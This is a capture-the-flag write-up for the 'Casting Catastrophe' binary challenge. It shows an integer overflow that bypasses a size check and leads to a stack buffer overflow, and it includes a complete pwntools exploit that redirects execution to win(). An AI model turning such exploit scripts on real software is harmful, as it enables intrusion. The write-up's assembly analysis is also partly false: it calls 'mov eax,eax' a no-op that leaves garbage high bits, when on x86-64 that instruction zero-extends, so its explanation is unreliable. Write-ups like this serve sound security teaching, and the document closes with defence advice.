# Write-up: Casting Catastrophe Challenge

## Challenge Overview
**Challenge Name**: Casting Catastrophe (Easy)  
**Category**: Binary Exploitation  
**Vulnerability**: Integer Overflow → Buffer Overflow  
**Protection**: Unknown (likely no PIE, no stack canaries)  
**Goal**: Overwrite return address to call `win()` function at `0x4016b9`

## Technical Analysis

### Vulnerability Location
The vulnerability exists in the challenge function where user input is processed:

```c
int num_records, record_size;
scanf("%d", &num_records);    // [rbp-0x74]
scanf("%d", &record_size);    // [rbp-0x78]

// 32-bit multiplication and check
if (num_records * record_size > 0x52) { // 82 decimal
    __assert_fail();
}

// 64-bit multiplication for actual read size
long total_size = (long)num_records * (long)record_size;
read(0, buffer, total_size);
```

### The Vulnerability
**Root Cause**: Mismatch between 32-bit and 64-bit multiplication with improper sign/zero extension.

1. **32-bit Check**: Uses `imul eax, edx` and compares with `0x52`
2. **64-bit Usage**: Uses `imul rax, rdx` for the actual `read` size
3. **Extension Bug**: `mov eax, eax` instruction doesn't properly zero-extend, leaving garbage in high bits

### Exploitation Strategy

#### Method 1: Integer Overflow (Used in Solution)
```python
num_records = 65536    # 0x10000
record_size = 65536    # 0x10000
```

**Why this works**:
- 32-bit: `0x10000 * 0x10000 = 0x100000000 → 0x00000000` (overflow to 0)
- 0 ≤ 82 → **Check passed**
- 64-bit: Garbage high bits create huge number → **Large read allowed**

#### Method 2: Negative Numbers (Alternative)
```python
num_records = -1
record_size = -82
```
- 32-bit signed: `-1 * -82 = 82` → **Check passed**  
- 64-bit: Sign extension creates large number

### Exploit Development

#### Step 1: Find Offset to Return Address
From debug output:
- Return address located at `0x7ffc1b6820e8`
- Buffer starts at `0x7ffc1b682070`
- **Offset**: `0x7ffc1b6820e8 - 0x7ffc1b682070 = 0x78 = 120 bytes`

#### Step 2: Craft Payload
```python
payload = b'A' * 120          # Padding to return address
payload += p64(0x4016b9)      # Address of win() function in little-endian
```

#### Step 3: Full Exploit
```python
#!/usr/bin/env python3
from pwn import *

# Start the challenge
p = process('/challenge/casting-catastrophe-easy')

# Trigger integer overflow
p.recvuntil('Number of payload records to send:')
p.sendline(b'65536')

p.recvuntil('Size of each payload record:') 
p.sendline(b'65536')

# Craft buffer overflow payload
payload = b'A' * 120
payload += p64(0x4016b9)  # win() function address

# Send exploit
p.sendline(payload)

# Get flag
p.interactive()
```

## Technical Details

### Assembly Code Analysis
Key instructions causing the vulnerability:
```assembly
; 32-bit check (vulnerable)
mov    eax,DWORD PTR [rbp-0x74]
mov    edx,DWORD PTR [rbp-0x78] 
imul   eax,edx                 ; 32-bit multiplication
cmp    eax,0x52                ; compare with 82
jbe    ...                     ; jump if below/equal

; 64-bit usage (exploitable)  
mov    eax,DWORD PTR [rbp-0x74]
mov    eax,eax                 ; NOP - doesn't clear high bits!
mov    QWORD PTR [rbp-0x10],rax
mov    eax,DWORD PTR [rbp-0x78]
mov    edx,eax
mov    rax,QWORD PTR [rbp-0x10]
imul   rax,rdx                 ; 64-bit multiplication with garbage
```

### Memory Layout
```
+---------------------+
| Input Buffer        | ← rbp-0x70 (start)
| ...                 |
| ...                 |
| ...                 |
+---------------------+
| Saved RBP           | ← rbp
+---------------------+
| Return Address      | ← rbp+0x8 (offset 120 from buffer)
+---------------------+
```

## Defense Recommendations

### For Developers
1. **Consistent Data Types**: Use same integer sizes for checks and operations
2. **Proper Extension**: Use `movsx`/`movzx` for proper sign/zero extension
3. **Bounds Checking**: Validate inputs before arithmetic operations
4. **Use Safe Functions**: Prefer `fgets()` + `strtol()` over `scanf("%d")`

### Compiler Protections
- **Stack Canaries**: Detect buffer overflows
- **PIE**: Make addresses unpredictable
- **FORTIFY_SOURCE**: Catch buffer length issues

## Conclusion

This challenge demonstrates a classic **integer overflow to buffer overflow** attack chain:
1. **Input Validation Bypass**: Integer overflow bypasses size check
2. **Memory Corruption**: Large read enables buffer overflow
3. **Control Flow Hijack**: Overwrite return address with `win()` function

The exploit succeeds due to improper type handling between 32-bit validation and 64-bit operation, highlighting the importance of consistent data type usage in secure programming.
